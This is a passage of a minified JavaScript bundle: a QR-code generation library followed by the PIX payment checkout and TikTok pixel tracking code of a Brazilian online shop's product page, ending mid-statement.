_={N1:3,N2:3,N3:40,N4:10};h.isValid=function(e){return e!=null&&e!==""&&!isNaN(e)&&e>=0&&e<=7};h.from=function(e){return h.isValid(e)?parseInt(e,10):void 0};h.getPenaltyN1=function(e){let n=e.size,o=0,r=0,i=0,s=null,a=null;for(let c=0;c<n;c++){r=i=0,s=a=null;for(let l=0;l<n;l++){let d=e.get(c,l);d===s?r++:(r>=5&&(o+=_.N1+(r-5)),s=d,r=1),d=e.get(l,c),d===a?i++:(i>=5&&(o+=_.N1+(i-5)),a=d,i=1)}r>=5&&(o+=_.N1+(r-5)),i>=5&&(o+=_.N1+(i-5))}return o};h.getPenaltyN2=function(e){let n=e.size,o=0;for(let r=0;r<n-1;r++)for(let i=0;i<n-1;i++){let s=e.get(r,i)+e.get(r,i+1)+e.get(r+1,i)+e.get(r+1,i+1);(s===4||s===0)&&o++}return o*_.N2};h.getPenaltyN3=function(e){let n=e.size,o=0,r=0,i=0;for(let s=0;s<n;s++){r=i=0;for(let a=0;a<n;a++)r=r<<1&2047|e.get(s,a),a>=10&&(r===1488||r===93)&&o++,i=i<<1&2047|e.get(a,s),a>=10&&(i===1488||i===93)&&o++}return o*_.N3};h.getPenaltyN4=function(e){let n=0,o=e.data.length;for(let i=0;i<o;i++)n+=e.data[i];return Math.abs(Math.ceil(n*100/o/5)-10)*_.N4};function An(t,e,n){switch(t){case h.Patterns.PATTERN000:return(e+n)%2===0;case h.Patterns.PATTERN001:return e%2===0;case h.Patterns.PATTERN010:return n%3===0;case h.Patterns.PATTERN011:return(e+n)%3===0;case h.Patterns.PATTERN100:return(Math.floor(e/2)+Math.floor(n/3))%2===0;case h.Patterns.PATTERN101:return e*n%2+e*n%3===0;case h.Patterns.PATTERN110:return(e*n%2+e*n%3)%2===0;case h.Patterns.PATTERN111:return(e*n%3+(e+n)%2)%2===0;default:throw new Error("bad maskPattern:"+t)}}h.applyMask=function(e,n){let o=n.size;for(let r=0;r<o;r++)for(let i=0;i<o;i++)n.isReserved(i,r)||n.xor(i,r,An(e,i,r))};h.getBestMask=function(e,n){let o=Object.keys(h.Patterns).length,r=0,i=1/0;for(let s=0;s<o;s++){n(s),h.applyMask(s,e);let a=h.getPenaltyN1(e)+h.getPenaltyN2(e)+h.getPenaltyN3(e)+h.getPenaltyN4(e);h.applyMask(s,e),a<i&&(i=a,r=s)}return r}});var ye=g(me=>{var T=ee(),ne=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],oe=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];me.getBlocksCount=function(e,n){switch(n){case T.L:return ne[(e-1)*4+0];case T.M:return ne[(e-1)*4+1];case T.Q:return ne[(e-1)*4+2];case T.H:return ne[(e-1)*4+3];default:return}};me.getTotalCodewordsCount=function(e,n){switch(n){case T.L:return oe[(e-1)*4+0];case T.M:return oe[(e-1)*4+1];case T.Q:return oe[(e-1)*4+2];case T.H:return oe[(e-1)*4+3];default:return}}});var ft=g(ie=>{var K=new Uint8Array(512),re=new Uint8Array(256);(function(){let e=1;for(let n=0;n<255;n++)K[n]=e,re[e]=n,e<<=1,e&256&&(e^=285);for(let n=255;n<512;n++)K[n]=K[n-255]})();ie.log=function(e){if(e<1)throw new Error("log("+e+")");return re[e]};ie.exp=function(e){return K[e]};ie.mul=function(e,n){return e===0||n===0?0:K[re[e]+re[n]]}});var gt=g(J=>{var we=ft();J.mul=function(e,n){let o=new Uint8Array(e.length+n.length-1);for(let r=0;r<e.length;r++)for(let i=0;i<n.length;i++)o[r+i]^=we.mul(e[r],n[i]);return o};J.mod=function(e,n){let o=new Uint8Array(e);for(;o.length-n.length>=0;){let r=o[0];for(let s=0;s<n.length;s++)o[s]^=we.mul(n[s],r);let i=0;for(;i<o.length&&o[i]===0;)i++;o=o.slice(i)}return o};J.generateECPolynomial=function(e){let n=new Uint8Array([1]);for(let o=0;o<e;o++)n=J.mul(n,new Uint8Array([1,we.exp(o)]));return n}});var mt=g((ko,pt)=>{var ht=gt();function Ce(t){this.genPoly=void 0,this.degree=t,this.degree&&this.initialize(this.degree)}Ce.prototype.initialize=function(e){this.degree=e,this.genPoly=ht.generateECPolynomial(this.degree)};Ce.prototype.encode=function(e){if(!this.genPoly)throw new Error("Encoder not initialized");let n=new Uint8Array(e.length+this.degree);n.set(e);let o=ht.mod(n,this.genPoly),r=this.degree-o.length;if(r>0){let i=new Uint8Array(this.degree);return i.set(o,r),i}return o};pt.exports=Ce});var Ee=g(yt=>{yt.isValid=function(e){return!isNaN(e)&&e>=1&&e<=40}});var Ie=g(P=>{var wt="[0-9]+",Nn="[A-Z $%*+\\-./:]+",H="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";H=H.replace(/u/g,"\\u");var xn="(?:(?![A-Z0-9 $%*+\\-./:]|"+H+`)(?:.|[\r
-]))+`;P.KANJI=new RegExp(H,"g");P.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g");P.BYTE=new RegExp(xn,"g");P.NUMERIC=new RegExp(wt,"g");P.ALPHANUMERIC=new RegExp(Nn,"g");var Tn=new RegExp("^"+H+"$"),Bn=new RegExp("^"+wt+"$"),bn=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");P.testKanji=function(e){return Tn.test(e)};P.testNumeric=function(e){return Bn.test(e)};P.testAlphanumeric=function(e){return bn.test(e)}});var B=g(m=>{var Mn=Ee(),Se=Ie();m.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]};m.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]};m.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]};m.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]};m.MIXED={bit:-1};m.getCharCountIndicator=function(e,n){if(!e.ccBits)throw new Error("Invalid mode: "+e);if(!Mn.isValid(n))throw new Error("Invalid version: "+n);return n>=1&&n<10?e.ccBits[0]:n<27?e.ccBits[1]:e.ccBits[2]};m.getBestModeForData=function(e){return Se.testNumeric(e)?m.NUMERIC:Se.testAlphanumeric(e)?m.ALPHANUMERIC:Se.testKanji(e)?m.KANJI:m.BYTE};m.toString=function(e){if(e&&e.id)return e.id;throw new Error("Invalid mode")};m.isValid=function(e){return e&&e.bit&&e.ccBits};function _n(t){if(typeof t!="string")throw new Error("Param is not a string");switch(t.toLowerCase()){case"numeric":return m.NUMERIC;case"alphanumeric":return m.ALPHANUMERIC;case"kanji":return m.KANJI;case"byte":return m.BYTE;default:throw new Error("Unknown mode: "+t)}}m.from=function(e,n){if(m.isValid(e))return e;try{return _n(e)}catch{return n}}});var Pt=g(R=>{var se=x(),Rn=ye(),Ct=ee(),b=B(),Pe=Ee(),It=7973,Et=se.getBCHDigit(It);function Ln(t,e,n){for(let o=1;o<=40;o++)if(e<=R.getCapacity(o,n,t))return o}function St(t,e){return b.getCharCountIndicator(t,e)+4}function kn(t,e){let n=0;return t.forEach(function(o){let r=St(o.mode,e);n+=r+o.getBitsLength()}),n}function Dn(t,e){for(let n=1;n<=40;n++)if(kn(t,n)<=R.getCapacity(n,e,b.MIXED))return n}R.from=function(e,n){return Pe.isValid(e)?parseInt(e,10):n};R.getCapacity=function(e,n,o){if(!Pe.isValid(e))throw new Error("Invalid QR Code version");typeof o>"u"&&(o=b.BYTE);let r=se.getSymbolTotalCodewords(e),i=Rn.getTotalCodewordsCount(e,n),s=(r-i)*8;if(o===b.MIXED)return s;let a=s-St(o,e);switch(o){case b.NUMERIC:return Math.floor(a/10*3);case b.ALPHANUMERIC:return Math.floor(a/11*2);case b.KANJI:return Math.floor(a/13);case b.BYTE:default:return Math.floor(a/8)}};R.getBestVersionForData=function(e,n){let o,r=Ct.from(n,Ct.M);if(Array.isArray(e)){if(e.length>1)return Dn(e,r);if(e.length===0)return 1;o=e[0]}else o=e;return Ln(o.mode,o.getLength(),r)};R.getEncodedBits=function(e){if(!Pe.isValid(e)||e<7)throw new Error("Invalid QR Code version");let n=e<<12;for(;se.getBCHDigit(n)-Et>=0;)n^=It<<se.getBCHDigit(n)-Et;return e<<12|n}});var Tt=g(xt=>{var Ae=x(),Nt=1335,qn=21522,At=Ae.getBCHDigit(Nt);xt.getEncodedBits=function(e,n){let o=e.bit<<3|n,r=o<<10;for(;Ae.getBCHDigit(r)-At>=0;)r^=Nt<<Ae.getBCHDigit(r)-At;return(o<<10|r)^qn}});var bt=g((zo,Bt)=>{var Un=B();function U(t){this.mode=Un.NUMERIC,this.data=t.toString()}U.getBitsLength=function(e){return 10*Math.floor(e/3)+(e%3?e%3*3+1:0)};U.prototype.getLength=function(){return this.data.length};U.prototype.getBitsLength=function(){return U.getBitsLength(this.data.length)};U.prototype.write=function(e){let n,o,r;for(n=0;n+3<=this.data.length;n+=3)o=this.data.substr(n,3),r=parseInt(o,10),e.put(r,10);let i=this.data.length-n;i>0&&(o=this.data.substr(n),r=parseInt(o,10),e.put(r,i*3+1))};Bt.exports=U});var _t=g((Vo,Mt)=>{var Fn=B(),Ne=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function F(t){this.mode=Fn.ALPHANUMERIC,this.data=t}F.getBitsLength=function(e){return 11*Math.floor(e/2)+6*(e%2)};F.prototype.getLength=function(){return this.data.length};F.prototype.getBitsLength=function(){return F.getBitsLength(this.data.length)};F.prototype.write=function(e){let n;for(n=0;n+2<=this.data.length;n+=2){let o=Ne.indexOf(this.data[n])*45;o+=Ne.indexOf(this.data[n+1]),e.put(o,11)}this.data.length%2&&e.put(Ne.indexOf(this.data[n]),6)};Mt.exports=F});var Lt=g((vo,Rt)=>{var On=B();function O(t){this.mode=On.BYTE,typeof t=="string"?this.data=new TextEncoder().encode(t):this.data=new Uint8Array(t)}O.getBitsLength=function(e){return e*8};O.prototype.getLength=function(){return this.data.length};O.prototype.getBitsLength=function(){return O.getBitsLength(this.data.length)};O.prototype.write=function(t){for(let e=0,n=this.data.length;e<n;e++)t.put(this.data[e],8)};Rt.exports=O});var Dt=g((Ko,kt)=>{var zn=B(),Vn=x();function z(t){this.mode=zn.KANJI,this.data=t}z.getBitsLength=function(e){return e*13};z.prototype.getLength=function(){return this.data.length};z.prototype.getBitsLength=function(){return z.getBitsLength(this.data.length)};z.prototype.write=function(t){let e;for(e=0;e<this.data.length;e++){let n=Vn.toSJIS(this.data[e]);if(n>=33088&&n<=40956)n-=33088;else if(n>=57408&&n<=60351)n-=49472;else throw new Error("Invalid SJIS character: "+this.data[e]+`
-Make sure your charset is UTF-8`);n=(n>>>8&255)*192+(n&255),t.put(n,13)}};kt.exports=z});var qt=g((Jo,xe)=>{"use strict";var Y={single_source_shortest_paths:function(t,e,n){var o={},r={};r[e]=0;var i=Y.PriorityQueue.make();i.push(e,0);for(var s,a,c,l,d,y,p,C,A;!i.empty();){s=i.pop(),a=s.value,l=s.cost,d=t[a]||{};for(c in d)d.hasOwnProperty(c)&&(y=d[c],p=l+y,C=r[c],A=typeof r[c]>"u",(A||C>p)&&(r[c]=p,i.push(c,p),o[c]=a))}if(typeof n<"u"&&typeof r[n]>"u"){var N=["Could not find a path from ",e," to ",n,"."].join("");throw new Error(N)}return o},extract_shortest_path_from_predecessor_list:function(t,e){for(var n=[],o=e,r;o;)n.push(o),r=t[o],o=t[o];return n.reverse(),n},find_path:function(t,e,n){var o=Y.single_source_shortest_paths(t,e,n);return Y.extract_shortest_path_from_predecessor_list(o,n)},PriorityQueue:{make:function(t){var e=Y.PriorityQueue,n={},o;t=t||{};for(o in e)e.hasOwnProperty(o)&&(n[o]=e[o]);return n.queue=[],n.sorter=t.sorter||e.default_sorter,n},default_sorter:function(t,e){return t.cost-e.cost},push:function(t,e){var n={value:t,cost:e};this.queue.push(n),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return this.queue.length===0}}};typeof xe<"u"&&(xe.exports=Y)});var Jt=g(V=>{var f=B(),Ot=bt(),zt=_t(),Vt=Lt(),vt=Dt(),j=Ie(),ae=x(),vn=qt();function Ut(t){return unescape(encodeURIComponent(t)).length}function $(t,e,n){let o=[],r;for(;(r=t.exec(n))!==null;)o.push({data:r[0],index:r.index,mode:e,length:r[0].length});return o}function Kt(t){let e=$(j.NUMERIC,f.NUMERIC,t),n=$(j.ALPHANUMERIC,f.ALPHANUMERIC,t),o,r;return ae.isKanjiModeEnabled()?(o=$(j.BYTE,f.BYTE,t),r=$(j.KANJI,f.KANJI,t)):(o=$(j.BYTE_KANJI,f.BYTE,t),r=[]),e.concat(n,o,r).sort(function(s,a){return s.index-a.index}).map(function(s){return{data:s.data,mode:s.mode,length:s.length}})}function Te(t,e){switch(e){case f.NUMERIC:return Ot.getBitsLength(t);case f.ALPHANUMERIC:return zt.getBitsLength(t);case f.KANJI:return vt.getBitsLength(t);case f.BYTE:return Vt.getBitsLength(t)}}function Kn(t){return t.reduce(function(e,n){let o=e.length-1>=0?e[e.length-1]:null;return o&&o.mode===n.mode?(e[e.length-1].data+=n.data,e):(e.push(n),e)},[])}function Jn(t){let e=[];for(let n=0;n<t.length;n++){let o=t[n];switch(o.mode){case f.NUMERIC:e.push([o,{data:o.data,mode:f.ALPHANUMERIC,length:o.length},{data:o.data,mode:f.BYTE,length:o.length}]);break;case f.ALPHANUMERIC:e.push([o,{data:o.data,mode:f.BYTE,length:o.length}]);break;case f.KANJI:e.push([o,{data:o.data,mode:f.BYTE,length:Ut(o.data)}]);break;case f.BYTE:e.push([{data:o.data,mode:f.BYTE,length:Ut(o.data)}])}}return e}function Hn(t,e){let n={},o={start:{}},r=["start"];for(let i=0;i<t.length;i++){let s=t[i],a=[];for(let c=0;c<s.length;c++){let l=s[c],d=""+i+c;a.push(d),n[d]={node:l,lastCount:0},o[d]={};for(let y=0;y<r.length;y++){let p=r[y];n[p]&&n[p].node.mode===l.mode?(o[p][d]=Te(n[p].lastCount+l.length,l.mode)-Te(n[p].lastCount,l.mode),n[p].lastCount+=l.length):(n[p]&&(n[p].lastCount=l.length),o[p][d]=Te(l.length,l.mode)+4+f.getCharCountIndicator(l.mode,e))}}r=a}for(let i=0;i<r.length;i++)o[r[i]].end=0;return{map:o,table:n}}function Ft(t,e){let n,o=f.getBestModeForData(t);if(n=f.from(e,o),n!==f.BYTE&&n.bit<o.bit)throw new Error('"'+t+'" cannot be encoded with mode '+f.toString(n)+`.
- Suggested mode is: `+f.toString(o));switch(n===f.KANJI&&!ae.isKanjiModeEnabled()&&(n=f.BYTE),n){case f.NUMERIC:return new Ot(t);case f.ALPHANUMERIC:return new zt(t);case f.KANJI:return new vt(t);case f.BYTE:return new Vt(t)}}V.fromArray=function(e){return e.reduce(function(n,o){return typeof o=="string"?n.push(Ft(o,null)):o.data&&n.push(Ft(o.data,o.mode)),n},[])};V.fromString=function(e,n){let o=Kt(e,ae.isKanjiModeEnabled()),r=Jn(o),i=Hn(r,n),s=vn.find_path(i.map,"start","end"),a=[];for(let c=1;c<s.length-1;c++)a.push(i.table[s[c]].node);return V.fromArray(Kn(a))};V.rawSplit=function(e){return V.fromArray(Kt(e,ae.isKanjiModeEnabled()))}});var Yt=g(Ht=>{var ue=x(),Be=ee(),Yn=rt(),jn=st(),$n=at(),Gn=lt(),_e=dt(),Re=ye(),Qn=mt(),ce=Pt(),Xn=Tt(),Wn=B(),be=Jt();function Zn(t,e){let n=t.size,o=Gn.getPositions(e);for(let r=0;r<o.length;r++){let i=o[r][0],s=o[r][1];for(let a=-1;a<=7;a++)if(!(i+a<=-1||n<=i+a))for(let c=-1;c<=7;c++)s+c<=-1||n<=s+c||(a>=0&&a<=6&&(c===0||c===6)||c>=0&&c<=6&&(a===0||a===6)||a>=2&&a<=4&&c>=2&&c<=4?t.set(i+a,s+c,!0,!0):t.set(i+a,s+c,!1,!0))}}function eo(t){let e=t.size;for(let n=8;n<e-8;n++){let o=n%2===0;t.set(n,6,o,!0),t.set(6,n,o,!0)}}function to(t,e){let n=$n.getPositions(e);for(let o=0;o<n.length;o++){let r=n[o][0],i=n[o][1];for(let s=-2;s<=2;s++)for(let a=-2;a<=2;a++)s===-2||s===2||a===-2||a===2||s===0&&a===0?t.set(r+s,i+a,!0,!0):t.set(r+s,i+a,!1,!0)}}function no(t,e){let n=t.size,o=ce.getEncodedBits(e),r,i,s;for(let a=0;a<18;a++)r=Math.floor(a/3),i=a%3+n-8-3,s=(o>>a&1)===1,t.set(r,i,s,!0),t.set(i,r,s,!0)}function Me(t,e,n){let o=t.size,r=Xn.getEncodedBits(e,n),i,s;for(i=0;i<15;i++)s=(r>>i&1)===1,i<6?t.set(i,8,s,!0):i<8?t.set(i+1,8,s,!0):t.set(o-15+i,8,s,!0),i<8?t.set(8,o-i-1,s,!0):i<9?t.set(8,15-i-1+1,s,!0):t.set(8,15-i-1,s,!0);t.set(o-8,8,1,!0)}function oo(t,e){let n=t.size,o=-1,r=n-1,i=7,s=0;for(let a=n-1;a>0;a-=2)for(a===6&&a--;;){for(let c=0;c<2;c++)if(!t.isReserved(r,a-c)){let l=!1;s<e.length&&(l=(e[s]>>>i&1)===1),t.set(r,a-c,l),i--,i===-1&&(s++,i=7)}if(r+=o,r<0||n<=r){r-=o,o=-o;break}}}function ro(t,e,n){let o=new Yn;n.forEach(function(c){o.put(c.mode.bit,4),o.put(c.getLength(),Wn.getCharCountIndicator(c.mode,t)),c.write(o)});let r=ue.getSymbolTotalCodewords(t),i=Re.getTotalCodewordsCount(t,e),s=(r-i)*8;for(o.getLengthInBits()+4<=s&&o.put(0,4);o.getLengthInBits()%8!==0;)o.putBit(0);let a=(s-o.getLengthInBits())/8;for(let c=0;c<a;c++)o.put(c%2?17:236,8);return io(o,t,e)}function io(t,e,n){let o=ue.getSymbolTotalCodewords(e),r=Re.getTotalCodewordsCount(e,n),i=o-r,s=Re.getBlocksCount(e,n),a=o%s,c=s-a,l=Math.floor(o/s),d=Math.floor(i/s),y=d+1,p=l-d,C=new Qn(p),A=0,N=new Array(s),Xe=new Array(s),fe=0,fn=new Uint8Array(t.buffer);for(let q=0;q<s;q++){let he=q<c?d:y;N[q]=fn.slice(A,A+he),Xe[q]=C.encode(N[q]),A+=he,fe=Math.max(fe,he)}let ge=new Uint8Array(o),We=0,I,S;for(I=0;I<fe;I++)for(S=0;S<s;S++)I<N[S].length&&(ge[We++]=N[S][I]);for(I=0;I<p;I++)for(S=0;S<s;S++)ge[We++]=Xe[S][I];return ge}function so(t,e,n,o){let r;if(Array.isArray(t))r=be.fromArray(t);else if(typeof t=="string"){let l=e;if(!l){let d=be.rawSplit(t);l=ce.getBestVersionForData(d,n)}r=be.fromString(t,l||40)}else throw new Error("Invalid data");let i=ce.getBestVersionForData(r,n);if(!i)throw new Error("The amount of data is too big to be stored in a QR Code");if(!e)e=i;else if(e<i)throw new Error(`
-The chosen QR Code version cannot contain this amount of data.
-Minimum version required to store current data is: `+i+`.
-`);let s=ro(e,n,r),a=ue.getSymbolSize(e),c=new jn(a);return Zn(c,e),eo(c),to(c,e),Me(c,n,0),e>=7&&no(c,e),oo(c,s),isNaN(o)&&(o=_e.getBestMask(c,Me.bind(null,c,n))),_e.applyMask(o,c),Me(c,n,o),{modules:c,version:e,errorCorrectionLevel:n,maskPattern:o,segments:r}}Ht.create=function(e,n){if(typeof e>"u"||e==="")throw new Error("No input text");let o=Be.M,r,i;return typeof n<"u"&&(o=Be.from(n.errorCorrectionLevel,Be.M),r=ce.from(n.version),i=_e.from(n.maskPattern),n.toSJISFunc&&ue.setToSJISFunction(n.toSJISFunc)),so(e,r,o,i)}});var Le=g(L=>{function jt(t){if(typeof t=="number"&&(t=t.toString()),typeof t!="string")throw new Error("Color should be defined as hex string");let e=t.slice().replace("#","").split("");if(e.length<3||e.length===5||e.length>8)throw new Error("Invalid hex color: "+t);(e.length===3||e.length===4)&&(e=Array.prototype.concat.apply([],e.map(function(o){return[o,o]}))),e.length===6&&e.push("F","F");let n=parseInt(e.join(""),16);return{r:n>>24&255,g:n>>16&255,b:n>>8&255,a:n&255,hex:"#"+e.slice(0,6).join("")}}L.getOptions=function(e){e||(e={}),e.color||(e.color={});let n=typeof e.margin>"u"||e.margin===null||e.margin<0?4:e.margin,o=e.width&&e.width>=21?e.width:void 0,r=e.scale||4;return{width:o,scale:o?4:r,margin:n,color:{dark:jt(e.color.dark||"#000000ff"),light:jt(e.color.light||"#ffffffff")},type:e.type,rendererOpts:e.rendererOpts||{}}};L.getScale=function(e,n){return n.width&&n.width>=e+n.margin*2?n.width/(e+n.margin*2):n.scale};L.getImageWidth=function(e,n){let o=L.getScale(e,n);return Math.floor((e+n.margin*2)*o)};L.qrToImageData=function(e,n,o){let r=n.modules.size,i=n.modules.data,s=L.getScale(r,o),a=Math.floor((r+o.margin*2)*s),c=o.margin*s,l=[o.color.light,o.color.dark];for(let d=0;d<a;d++)for(let y=0;y<a;y++){let p=(d*a+y)*4,C=o.color.light;if(d>=c&&y>=c&&d<a-c&&y<a-c){let A=Math.floor((d-c)/s),N=Math.floor((y-c)/s);C=l[i[A*r+N]?1:0]}e[p++]=C.r,e[p++]=C.g,e[p++]=C.b,e[p]=C.a}}});var $t=g(le=>{var ke=Le();function ao(t,e,n){t.clearRect(0,0,e.width,e.height),e.style||(e.style={}),e.height=n,e.width=n,e.style.height=n+"px",e.style.width=n+"px"}function co(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}le.render=function(e,n,o){let r=o,i=n;typeof r>"u"&&(!n||!n.getContext)&&(r=n,n=void 0),n||(i=co()),r=ke.getOptions(r);let s=ke.getImageWidth(e.modules.size,r),a=i.getContext("2d"),c=a.createImageData(s,s);return ke.qrToImageData(c.data,e,r),ao(a,i,s),a.putImageData(c,0,0),i};le.renderToDataURL=function(e,n,o){let r=o;typeof r>"u"&&(!n||!n.getContext)&&(r=n,n=void 0),r||(r={});let i=le.render(e,n,r),s=r.type||"image/png",a=r.rendererOpts||{};return i.toDataURL(s,a.quality)}});var Xt=g(Qt=>{var uo=Le();function Gt(t,e){let n=t.a/255,o=e+'="'+t.hex+'"';return n<1?o+" "+e+'-opacity="'+n.toFixed(2).slice(1)+'"':o}function De(t,e,n){let o=t+e;return typeof n<"u"&&(o+=" "+n),o}function lo(t,e,n){let o="",r=0,i=!1,s=0;for(let a=0;a<t.length;a++){let c=Math.floor(a%e),l=Math.floor(a/e);!c&&!i&&(i=!0),t[a]?(s++,a>0&&c>0&&t[a-1]||(o+=i?De("M",c+n,.5+l+n):De("m",r,0),r=0,i=!1),c+1<e&&t[a+1]||(o+=De("h",s),s=0)):r++}return o}Qt.render=function(e,n,o){let r=uo.getOptions(n),i=e.modules.size,s=e.modules.data,a=i+r.margin*2,c=r.color.light.a?"<path "+Gt(r.color.light,"fill")+' d="M0 0h'+a+"v"+a+'H0z"/>':"",l="<path "+Gt(r.color.dark,"stroke")+' d="'+lo(s,i,r.margin)+'"/>',d='viewBox="0 0 '+a+" "+a+'"',p='<svg xmlns="http://www.w3.org/2000/svg" '+(r.width?'width="'+r.width+'" height="'+r.width+'" ':"")+d+' shape-rendering="crispEdges">'+c+l+`</svg>
-`;return typeof o=="function"&&o(null,p),p}});var Zt=g(G=>{var fo=tt(),qe=Yt(),Wt=$t(),go=Xt();function Ue(t,e,n,o,r){let i=[].slice.call(arguments,1),s=i.length,a=typeof i[s-1]=="function";if(!a&&!fo())throw new Error("Callback required as last argument");if(a){if(s<2)throw new Error("Too few arguments provided");s===2?(r=n,n=e,e=o=void 0):s===3&&(e.getContext&&typeof r>"u"?(r=o,o=void 0):(r=o,o=n,n=e,e=void 0))}else{if(s<1)throw new Error("Too few arguments provided");return s===1?(n=e,e=o=void 0):s===2&&!e.getContext&&(o=n,n=e,e=void 0),new Promise(function(c,l){try{let d=qe.create(n,o);c(t(d,e,o))}catch(d){l(d)}})}try{let c=qe.create(n,o);r(null,t(c,e,o))}catch(c){r(c)}}G.create=qe.create;G.toCanvas=Ue.bind(null,Wt.render);G.toDataURL=Ue.bind(null,Wt.renderToDataURL);G.toString=Ue.bind(null,function(t,e,n){return go.render(t,n)})});var ln=Cn(Zt(),1);var k="DBCS5ORC77U29DFSUC6G",ho="jbkikbdjti",po="Kit Dobr\xE1vel Duo 3 em 1",de=!1,en=!1;var Fe=new Map,tn=new Set,Oe=(t,e)=>`mareazul.tiktok.${k}.${e==="Purchase"?"purchase":"paid"}.${t}`;function nn(t,e){if(tn.has(Oe(t,e)))return!0;try{return localStorage.getItem(Oe(t,e))==="sent"}catch{return!1}}function ze(t=119.9){return{currency:"BRL",value:t,content_type:"product",contents:[{content_id:ho,content_name:po,quantity:1,price:t}]}}function on(){if(en)for(let[t,{id:e,amount:n,event:o}]of Fe){if(!nn(e,o)){window.ttq.track(o,ze(n/100),{event_id:`mareazul_${o==="Purchase"?"purchase":"paid"}_${e}`}),tn.add(t);try{localStorage.setItem(t,"sent")}catch{}}Fe.delete(t)}}function rn(){if(!document.querySelector('meta[name="checkout-test-mode"]')&&!(de||location.hostname!=="mare-azul.pages.dev")&&["/","/index.html","/checkout/","/pagamento/","/obrigado/"].includes(location.pathname)){de=!0;try{window.TiktokAnalyticsObject="ttq";let t=window.ttq=window.ttq||[];t.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],t.setAndDefer=(n,o)=>{n[o]=function(){n.push([o,...arguments])}};for(let n of t.methods)t.setAndDefer(t,n);t.instance=n=>{let o=t._i[n]||[];for(let r of t.methods)t.setAndDefer(o,r);return o},t._i=t._i||{},t._i[k]=[],t._i[k]._u="https://analytics.tiktok.com/i18n/pixel/events.js",t._t=t._t||{},t._t[k]=Date.now(),t._o=t._o||{},t._o[k]={};let e=document.createElement("script");e.async=!0,e.src=`${t._i[k]._u}?sdkid=${k}&lib=ttq`,e.onload=()=>{en=!0;try{on()}catch{}},document.head.appendChild(e),t.page(),["/","/index.html"].includes(location.pathname)&&t.track("ViewContent",ze()),location.pathname==="/checkout/"&&t.track("InitiateCheckout",ze())}catch{de=!1}}}function sn(t){t?.status!=="pending"||typeof t.pixCode!="string"||!t.pixCode.trim()||t.pixCode.includes("DEMONSTRACAO")||Number(t.expiresAt)>0&&Date.now()>=Number(t.expiresAt)||mo(t,"Purchase")}function mo(t,e){if(!(!de||!/^[a-f0-9-]{36}$/i.test(t.id||"")||!Number.isSafeInteger(t.amount)||t.amount<=0||nn(t.id,e))){Fe.set(Oe(t.id,e),{id:t.id,amount:t.amount,event:e});try{on()}catch{}}}var yo="mareazul.ironpayOrder",Q="mareazul.ironpayIntent",wo="pix-live-v2";function X(t=yo){try{let e=JSON.parse(sessionStorage.getItem(t)||"null");return/^[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$/i.test(e?.id||"")&&/^[a-f0-9]{64}$/.test(e?.accessToken||"")?e:null}catch{return null}}function W(t){window.__mareAzulPixDiagnostics=Object.freeze({version:wo,page:location.pathname,code:t.code||null,httpStatus:t.httpStatus||null,orderStatus:t.orderStatus||null,hasPix:!!t.hasPix,hasSession:!!X(),checkedAt:new Date().toISOString()})}async function an(t){if(!t.headers.get("Content-Type")?.includes("application/json"))throw new Error("API_RESPONSE_INVALID");try{return await t.json()}catch{throw new Error("API_RESPONSE_INVALID")}}function cn(t,e){return t?.id===e&&["creating","uncertain","rejected","pending","paid","canceled","refunded"].includes(t.status)}rn();var E=X(),u=t=>document.getElementById(t),un=30*60*1e3,Ve=!1,Z=!1,ve,Ke,Je="",dn=null,He;window.__mareAzulPixLoaded=!0;var Ye=(t,e)=>{u("paymentStatus").textContent=t,u("paymentMessage").textContent=e};function je(){let t=u("pixCode");if(!t.value)return;t.style.height="auto";let e=getComputedStyle(t),n=parseFloat(e.borderTopWidth)+parseFloat(e.borderBottomWidth);t.style.height=Math.max(96,Math.ceil(t.scrollHeight+n))+"px"}function $e(){clearTimeout(He),u("copyToast").hidden=!0,u("copyBackdrop").hidden=!0,u("copyToast").textContent="",clearInterval(Ke),u("pixCode").value="",u("copyPix").disabled=!0,u("pixCode").style.height="",u("copyPixIcon").disabled=!0,delete 